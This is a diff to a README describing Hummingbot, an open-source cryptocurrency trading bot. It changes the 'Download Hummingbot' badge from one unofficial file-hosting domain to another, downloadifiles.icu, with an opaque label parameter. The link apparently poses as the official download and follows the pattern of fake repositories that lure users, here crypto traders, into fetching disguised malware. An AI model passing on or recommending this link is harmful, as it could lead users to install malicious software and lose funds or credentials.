@@ -2,7 +2,7 @@
 
 Hummingbot is an open-source cryptocurrency trading bot designed to automate trading strategies, enabling users to participate in market making, arbitrage, and liquidity mining across various crypto exchanges. It is highly customizable, allowing traders to design and implement their own strategies or use pre-built ones to suit their trading preferences.
 
-[![Download Hummingbot](https://img.shields.io/badge/Download-Hummingbot%20-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download Hummingbot](https://img.shields.io/badge/Download-Hummingbot%20-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9)
 
 ### Key Features:
 - **Open-Source**:  
